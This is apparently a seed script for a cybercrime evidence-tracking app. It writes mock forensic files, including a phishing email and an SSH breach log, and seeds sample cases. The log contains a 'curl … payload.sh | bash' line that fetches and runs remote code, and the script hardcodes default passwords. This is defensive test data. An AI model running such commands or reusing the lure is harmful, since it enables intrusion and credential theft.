const path = require('path');
const fs = require('fs');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

// Support loading .env from backend directory or workspace root
require('dotenv').config({ path: path.resolve(__dirname, '.env') });
require('dotenv').config({ path: path.resolve(__dirname, '..', '.env') });

const User = require('./src/models/User');
const Incident = require('./src/models/Incident');
const EvidenceFile = require('./src/models/EvidenceFile');
const ChainOfCustodyLog = require('./src/models/ChainOfCustodyLog');
const { computeFileHashes } = require('./src/services/forensicService');

const SAMPLE_MOCK_FILES = [
  {
    filename: 'mock_phish_email.txt',
    mimeType: 'text/plain',
    category: 'Phishing',
    content: `Delivered-To: victim.employee@targetcorp.internal
Received: by 2002:a05:6512:4b1:: with SMTP id z1csp1843254lfo;
        Mon, 14 Sep 2026 08:21:14 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IFxR8y+Q2Kz738U8H012938472938471923
X-Received: by 2002:a2e:8893:0:b0:2ea:6990:f438 with SMTP id s19-20020a2e8893000000b002ea6990f438mr2914197nek.6.1726327274112;
ARC-Seal: i=1; a=rsa-sha256; t=1726327274; cv=none; d=google.com; s=arc-20240605;
Authentication-Results: mx.google.com;
       spf=softfail (google.com: domain of transitioning admin@secure-targetcorp-portal.xyz does not designate 198.51.100.42 as permitted sender) smtp.mailfrom=admin@secure-targetcorp-portal.xyz;
       dkim=neutral (bad sig) header.i=@secure-targetcorp-portal.xyz;
       dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=targetcorp.internal
Return-Path: <admin@secure-targetcorp-portal.xyz>
Received-SPF: softfail (google.com: domain of transitioning admin@secure-targetcorp-portal.xyz does not designate 198.51.100.42 as permitted sender) client-ip=198.51.100.42;
From: "TargetCorp IT Helpdesk" <admin@secure-targetcorp-portal.xyz>
To: victim.employee@targetcorp.internal
Subject: CRITICAL: Mandatory Enterprise SSO Credential Re-synchronization
Date: Mon, 14 Sep 2026 15:20:55 +0000
Message-ID: <20260914152055.78912.phish@secure-targetcorp-portal.xyz>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Dear Team Member,

Our Security Operations Center (SOC) detected unauthorized login attempts originating from IP address 198.51.100.42 (Bucharest, Romania) targeting your internal corporate profile.

In accordance with Information Security Policy ISO-27001-A9, all active employees must re-authenticate their domain credentials through our synchronized gateway within 12 hours of receiving this warning:

https://portal-auth.targetcorp-internal-verify.cc/login?token=sec-a8f9c2d1-e941

Failure to verify credentials prior to the deadline will result in immediate administrative directory suspension.

Sincerely,
Global IT Support & Infrastructure
TargetCorp Security Operations Center`,
  },
  {
    filename: 'crypto_tx_statement.csv',
    mimeType: 'text/csv',
    category: 'Financial Fraud',
    content: `timestamp,tx_hash,from_address,to_address,asset,amount,usd_value,fee_eth,status,mempool_flags
2026-09-12T14:22:01Z,0x3a8f9b2d01e456c87a1234ef56789abc0123def456789abcdef0123456789abc,0x71C813237a15498C1ae2a21e45bc34f9aA12e841,0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984,ETH,14.50000000,42050.00,0.0042,CONFIRMED,RAPID_TRANSFER
2026-09-12T14:35:18Z,0x4b7e12f3890ab2c4e6d801fa56789abc1234def56789abcdef0123456789abd,0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984,0x0D8775F648430679A709E98d2b0Cb6250d2887EF,USDT,42000.000000,42000.00,0.0021,CONFIRMED,MIXER_HOP_1
2026-09-12T14:48:55Z,0x9c8d7e6f5a4b3c2d1e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d,0x0D8775F648430679A709E98d2b0Cb6250d2887EF,0xdAC17F958D2ee523a2206206994597C13D831ec7,USDT,21000.000000,21000.00,0.0018,CONFIRMED,TORNADO_CASH_SPLIT_A
2026-09-12T14:49:10Z,0x2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e,0x0D8775F648430679A709E98d2b0Cb6250d2887EF,0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,USDT,21000.000000,21000.00,0.0019,CONFIRMED,TORNADO_CASH_SPLIT_B
2026-09-12T15:10:04Z,0x7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b,0xdAC17F958D2ee523a2206206994597C13D831ec7,0x529284F93297a7810A88941703e7CebB1f122D5E,WBTC,0.32500000,21000.00,0.0035,CONFIRMED,OFFRAMP_SUSPECT`,
  },
  {
    filename: 'server_auth_breach.log',
    mimeType: 'text/plain',
    category: 'Unauthorized Access',
    content: `Sep 15 02:14:01 prod-db-node01 sshd[14201]: Connection from 203.0.113.88 port 48210 on 10.0.0.15 port 22 rdomain ""
Sep 15 02:14:02 prod-db-node01 sshd[14201]: Failed password for invalid user root from 203.0.113.88 port 48210 ssh2
Sep 15 02:14:04 prod-db-node01 sshd[14205]: Failed password for invalid user admin from 203.0.113.88 port 48214 ssh2
Sep 15 02:14:06 prod-db-node01 sshd[14210]: Failed password for invalid user oracle from 203.0.113.88 port 48218 ssh2
Sep 15 02:14:09 prod-db-node01 sshd[14215]: Failed password for invalid user postgres from 203.0.113.88 port 48222 ssh2
Sep 15 02:15:33 prod-db-node01 sshd[14350]: Accepted publickey for svc_deploy from 203.0.113.88 port 48390 ssh2: RSA SHA256:4gHk9qY1vX/jkl39P1829384729182371982379128
Sep 15 02:15:33 prod-db-node01 systemd-logind[912]: New session 4192 of user svc_deploy.
Sep 15 02:16:12 prod-db-node01 sudo[14402]: svc_deploy : TTY=pts/0 ; PWD=/home/svc_deploy ; USER=root ; COMMAND=/bin/bash -c "curl -s http://198.51.100.99/payload.sh | bash"
Sep 15 02:16:13 prod-db-node01 sudo[14402]: pam_unix(sudo:session): session opened for user root(uid=0) by svc_deploy(uid=1002)
Sep 15 02:16:45 prod-db-node01 kernel: [89421.102391] audit: type=1400 audit(1726366605.102:842): apparmor="DENIED" operation="open" profile="/usr/sbin/mysqld" name="/etc/shadow" pid=14522 comm="mysqld_dump" requested_mask="r" denied_mask="r"
Sep 15 02:17:02 prod-db-node01 systemd[1]: auditd.service: Failed with result 'exit-code'.
Sep 15 02:17:30 prod-db-node01 sshd[14488]: pam_unix(sshd:session): session closed for user svc_deploy`,
  },
];

const runSeed = async () => {
  console.log('===============================================================');
  console.log('       CYBERTRACE DATABASE & EVIDENCE VAULT SEED SCRIPT        ');
  console.log('===============================================================');

  const mongoUri = process.env.MONGO_URI || 'mongodb://localhost:27017/cybertrace';
  console.log(`[Connecting] MongoDB URI: ${mongoUri}`);

  try {
    await mongoose.connect(mongoUri);
    console.log(`[Connected] Host: ${mongoose.connection.host} | DB: ${mongoose.connection.name}`);

    // ── 1. Clear Existing Collections ─────────────────────────────
    console.log('\n[1/6] Clearing existing database collections...');
    const userDel = await User.deleteMany({});
    const incidentDel = await Incident.deleteMany({});
    const evidenceDel = await EvidenceFile.deleteMany({});

    // ChainOfCustodyLog is strictly append-only in Mongoose schema with pre-delete hooks.
    // We execute deleteMany directly on the native MongoDB driver collection to bypass hooks for seeding.
    const cocDel = await ChainOfCustodyLog.collection.deleteMany({});

    console.log(`  ✓ Cleared Users:            ${userDel.deletedCount} documents removed`);
    console.log(`  ✓ Cleared Incidents:        ${incidentDel.deletedCount} documents removed`);
    console.log(`  ✓ Cleared EvidenceFiles:    ${evidenceDel.deletedCount} documents removed`);
    console.log(`  ✓ Cleared CoC Audit Logs:   ${cocDel.deletedCount} documents removed`);

    // ── 2. Ensure Uploads Directory Exists ────────────────────────
    console.log('\n[2/6] Ensuring physical evidence vault directory exists...');
    const uploadsDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
      console.log(`  ✓ Created vault directory: ${uploadsDir}`);
    } else {
      console.log(`  ✓ Vault directory verified: ${uploadsDir}`);
    }

    // ── 3. Write Mock Evidence Files & Calculate Hashes ───────────
    console.log('\n[3/6] Writing mock evidence files and calculating SHA-256 / MD5 hashes...');
    const processedEvidence = {};

    for (const mock of SAMPLE_MOCK_FILES) {
      const filePath = path.join(uploadsDir, mock.filename);
      fs.writeFileSync(filePath, mock.content.trim() + '\n', 'utf-8');

      const stat = fs.statSync(filePath);
      const hashes = await computeFileHashes(filePath);

      processedEvidence[mock.filename] = {
        filename: mock.filename,
        storedFilename: mock.filename,
        mimeType: mock.mimeType,
        size: stat.size,
        sha256: hashes.sha256,
        md5: hashes.md5,
      };

      console.log(`  ✓ File: "${mock.filename}" (${stat.size} bytes)`);
      console.log(`    ├── SHA-256: ${hashes.sha256}`);
      console.log(`    └── MD5:     ${hashes.md5}`);
    }

    // ── 4. Seed Default Staff Accounts ────────────────────────────
    console.log('\n[4/6] Seeding default administrative and investigator accounts...');
    const adminPasswordHash = await bcrypt.hash('AdminPass123!', 10);
    const analystPasswordHash = await bcrypt.hash('AnalystPass123!', 10);

    const adminUser = await User.create({
      name: 'System Administrator',
      email: 'admin@cybertrace.local',
      passwordHash: adminPasswordHash,
      role: 'ADMIN',
    });

    const analyst1 = await User.create({
      name: 'Investigator Sarah Chen',
      email: 'analyst1@cybertrace.local',
      passwordHash: analystPasswordHash,
      role: 'INVESTIGATOR',
    });

    const analyst2 = await User.create({
      name: 'Investigator Marcus Vance',
      email: 'analyst2@cybertrace.local',
      passwordHash: analystPasswordHash,
      role: 'INVESTIGATOR',
    });

    console.log(`  ✓ Admin:          ${adminUser.email} (Role: ${adminUser.role})`);
    console.log(`  ✓ Investigator 1: ${analyst1.email} (Role: ${analyst1.role})`);
    console.log(`  ✓ Investigator 2: ${analyst2.email} (Role: ${analyst2.role})`);

    // ── 5. Seed 5 Cybercrime Cases ────────────────────────────────
    console.log('\n[5/6] Seeding 5 cybercrime cases at varying stages with linked evidence & CoC logs...');

    // Case 1: Investigating (Linked to mock_phish_email.txt)
    const case1 = await Incident.create({
      trackingId: 'CASE-2026-00001',
      title: 'Executive Spear-Phishing Campaign Targeting Payroll Credentials',
      category: 'Phishing',
      description: 'Targeted phishing email impersonating enterprise IT helpdesk with spoofed SPF/DKIM headers, redirecting department heads to an off-shore credential harvesting portal.',
      incidentDate: new Date('2026-09-14T08:30:00Z'),
      complainantName: 'David Miller',
      complainantContact: 'd.miller@targetcorp.internal',
      status: 'Investigating',
      priority: 'Critical',
      assignedTo: analyst1._id,
      notes: [
        {
          author: analyst1.email,
          text: 'Extracted email headers and analyzed spoofed SPF/DKIM records. Harvesting server identified on bulletproof hosting network.',
          date: new Date('2026-09-14T11:15:00Z'),
        },
      ],
    });

    const ev1Data = processedEvidence['mock_phish_email.txt'];
    const ev1 = await EvidenceFile.create({
      incidentId: case1._id,
      originalFilename: ev1Data.filename,
      storedFilename: ev1Data.storedFilename,
      mimeType: ev1Data.mimeType,
      fileSizeBytes: ev1Data.size,
      sha256Hash: ev1Data.sha256,
      md5Hash: ev1Data.md5,
      integrityStatus: 'Unchecked',
      uploadedAt: new Date('2026-09-14T08:35:00Z'),
    });

    await ChainOfCustodyLog.create({
      evidenceId: ev1._id,
      incidentId: case1._id,
      action: 'INGESTION',
      performedBy: 'PUBLIC_ANONYMOUS',
      role: 'CITIZEN',
      ipAddress: '198.51.100.42',
      details: `Evidence "${ev1Data.filename}" ingested during public incident reporting. SHA-256: ${ev1Data.sha256}`,
      timestamp: new Date('2026-09-14T08:35:00Z'),
    });

    await ChainOfCustodyLog.create({
      evidenceId: ev1._id,
      incidentId: case1._id,
      action: 'VIEW',
      performedBy: analyst1.email,
      role: 'INVESTIGATOR',
      ipAddress: '10.0.4.12',
      details: 'Investigator opened evidence file for cryptographic header verification and domain correlation.',
      timestamp: new Date('2026-09-14T11:20:00Z'),
    });

    console.log(`  ✓ Seeded Case 1: [${case1.trackingId}] "${case1.title}"`);
    console.log(`    Stage: ${case1.status} | Priority: ${case1.priority} | Evidence: ${ev1.originalFilename}`);

    // Case 2: Under Review (Linked to crypto_tx_statement.csv)
    const case2 = await Incident.create({
      trackingId: 'CASE-2026-00002',
      title: 'Multi-Hop Crypto Drainer & Mixer Dispersion Scheme',
      category: 'Financial Fraud',
      description: 'Malicious smart contract approval drained 14.5 ETH and 42,000 USDT from decentralized treasury vault, immediately routed through multiple hops into Tornado Cash mixer pools.',
      incidentDate: new Date('2026-09-12T14:15:00Z'),
      complainantName: 'Elena Rostova',
      complainantContact: 'elena.rostova@crypto-hedge.io',
      status: 'Under Review',
      priority: 'High',
      assignedTo: analyst2._id,
      notes: [
        {
          author: analyst2.email,
          text: 'On-chain ledger analysis confirms rapid multi-hop dispersion across intermediary smart contracts before hitting privacy mixer pools.',
          date: new Date('2026-09-13T09:40:00Z'),
        },
      ],
    });

    const ev2Data = processedEvidence['crypto_tx_statement.csv'];
    const ev2 = await EvidenceFile.create({
      incidentId: case2._id,
      originalFilename: ev2Data.filename,
      storedFilename: ev2Data.storedFilename,
      mimeType: ev2Data.mimeType,
      fileSizeBytes: ev2Data.size,
      sha256Hash: ev2Data.sha256,
      md5Hash: ev2Data.md5,
      integrityStatus: 'Unchecked',
      uploadedAt: new Date('2026-09-12T14:20:00Z'),
    });

    await ChainOfCustodyLog.create({
      evidenceId: ev2._id,
      incidentId: case2._id,
      action: 'INGESTION',
      performedBy: 'PUBLIC_ANONYMOUS',
      role: 'CITIZEN',
      ipAddress: '203.0.113.19',
      details: `Evidence "${ev2Data.filename}" ingested during public incident reporting. SHA-256: ${ev2Data.sha256}`,
      timestamp: new Date('2026-09-12T14:20:00Z'),
    });

    console.log(`  ✓ Seeded Case 2: [${case2.trackingId}] "${case2.title}"`);
    console.log(`    Stage: ${case2.status} | Priority: ${case2.priority} | Evidence: ${ev2.originalFilename}`);

    // Case 3: Resolved (Linked to server_auth_breach.log)
    const case3 = await Incident.create({
      trackingId: 'CASE-2026-00003',
      title: 'Automated SSH Brute-Force and Privilege Escalation Breach',
      category: 'Unauthorized Access',
      description: 'Compromised service key allowed automated remote access to production database cluster; intruder attempted privilege escalation and shadow file dump.',
      incidentDate: new Date('2026-09-15T02:10:00Z'),
      complainantName: 'DevOps Security Operations',
      complainantContact: 'soc-alerts@targetcorp.internal',
      status: 'Resolved',
      priority: 'Critical',
      assignedTo: analyst1._id,
      notes: [
        {
          author: analyst1.email,
          text: 'Service account credentials revoked, perimeter firewall ACLs hardened, and AppArmor blocked unauthorized shadow file access.',
          date: new Date('2026-09-15T06:45:00Z'),
        },
        {
          author: adminUser.email,
          text: 'Cryptographic integrity verified against baseline hash. Threat eradicated and container cluster redeployed from verified image.',
          date: new Date('2026-09-15T08:00:00Z'),
        },
      ],
    });

    const ev3Data = processedEvidence['server_auth_breach.log'];
    const ev3 = await EvidenceFile.create({
      incidentId: case3._id,
      originalFilename: ev3Data.filename,
      storedFilename: ev3Data.storedFilename,
      mimeType: ev3Data.mimeType,
      fileSizeBytes: ev3Data.size,
      sha256Hash: ev3Data.sha256,
      md5Hash: ev3Data.md5,
      integrityStatus: 'Verified',
      uploadedAt: new Date('2026-09-15T02:25:00Z'),
    });

    await ChainOfCustodyLog.create({
      evidenceId: ev3._id,
      incidentId: case3._id,
      action: 'INGESTION',
      performedBy: 'PUBLIC_ANONYMOUS',
      role: 'CITIZEN',
      ipAddress: '198.51.100.99',
      details: `Evidence "${ev3Data.filename}" ingested during incident escalation. SHA-256: ${ev3Data.sha256}`,
      timestamp: new Date('2026-09-15T02:25:00Z'),
    });

    await ChainOfCustodyLog.create({
      evidenceId: ev3._id,
      incidentId: case3._id,
      action: 'VERIFY_PASS',
      performedBy: analyst1.email,
      role: 'INVESTIGATOR',
      ipAddress: '10.0.4.12',
      details: `Forensic verification passed. On-disk SHA-256 matches baseline hash: ${ev3Data.sha256}`,
      timestamp: new Date('2026-09-15T07:15:00Z'),
    });

    console.log(`  ✓ Seeded Case 3: [${case3.trackingId}] "${case3.title}"`);
    console.log(`    Stage: ${case3.status} | Priority: ${case3.priority} | Evidence: ${ev3.originalFilename}`);

    // Case 4: Reported (Fresh citizen report pending investigator review)
    const case4 = await Incident.create({
      trackingId: 'CASE-2026-00004',
      title: 'Corporate Identity Impersonation and Wire Transfer Redirection',
      category: 'Identity Theft',
      description: 'Adversary registered typosquatted domain impersonating vendor billing department, seeking redirection of pending $185,000 contractor disbursements.',
      incidentDate: new Date('2026-09-16T09:15:00Z'),
      complainantName: 'Anonymous',
      complainantContact: 'N/A',
      status: 'Reported',
      priority: 'Medium',
      assignedTo: null,
      notes: [],
    });

    console.log(`  ✓ Seeded Case 4: [${case4.trackingId}] "${case4.title}"`);
    console.log(`    Stage: ${case4.status} | Priority: ${case4.priority} | Unassigned`);

    // Case 5: Under Review (Extortion case with hospital patient data threat)
    const case5 = await Incident.create({
      trackingId: 'CASE-2026-00005',
      title: 'Double-Extortion Threat with Exfiltrated Patient Health Records',
      category: 'Extortion',
      description: 'Ransom group claims unauthorized extraction of 50,000 confidential patient medical records, threatening public release unless 5 BTC ransom is deposited.',
      incidentDate: new Date('2026-09-16T11:45:00Z'),
      complainantName: 'Metropolitan Healthcare Risk Team',
      complainantContact: 'compliance@metrohealth-system.org',
      status: 'Under Review',
      priority: 'Critical',
      assignedTo: analyst2._id,
      notes: [
        {
          author: analyst2.email,
          text: 'Threat intelligence team identified extortion communication portal. Coordination initiated with regional cybercrime taskforce.',
          date: new Date('2026-09-16T12:30:00Z'),
        },
      ],
    });

    console.log(`  ✓ Seeded Case 5: [${case5.trackingId}] "${case5.title}"`);
    console.log(`    Stage: ${case5.status} | Priority: ${case5.priority} | Assigned: ${analyst2.email}`);

    // ── 6. Summary and Clean Process Exit ─────────────────────────
    console.log('\n[6/6] Seeding completed successfully!');
    console.log('───────────────────────────────────────────────────────────────');
    console.log('Credentials Summary:');
    console.log('  • Admin:        admin@cybertrace.local     / AdminPass123!');
    console.log('  • Investigator: analyst1@cybertrace.local  / AnalystPass123!');
    console.log('  • Investigator: analyst2@cybertrace.local  / AnalystPass123!');
    console.log('Physical Vault:');
    console.log(`  • Location:     ${uploadsDir}`);
    console.log(`  • Files seeded: ${Object.keys(processedEvidence).join(', ')}`);
    console.log('Cases Seeded (5 total):');
    console.log('  • CASE-2026-00001 (Investigating - Phishing)');
    console.log('  • CASE-2026-00002 (Under Review - Financial Fraud)');
    console.log('  • CASE-2026-00003 (Resolved - Unauthorized Access)');
    console.log('  • CASE-2026-00004 (Reported - Identity Theft)');
    console.log('  • CASE-2026-00005 (Under Review - Extortion)');
    console.log('───────────────────────────────────────────────────────────────');

    await mongoose.connection.close();
    console.log('[CyberTrace] MongoDB connection closed cleanly. Exiting.');
    process.exit(0);
  } catch (error) {
    console.error('\n[FATAL ERROR during seed execution]');
    console.error(error);
    if (mongoose.connection.readyState !== 0) {
      await mongoose.connection.close();
    }
    process.exit(1);
  }
};

runSeed();
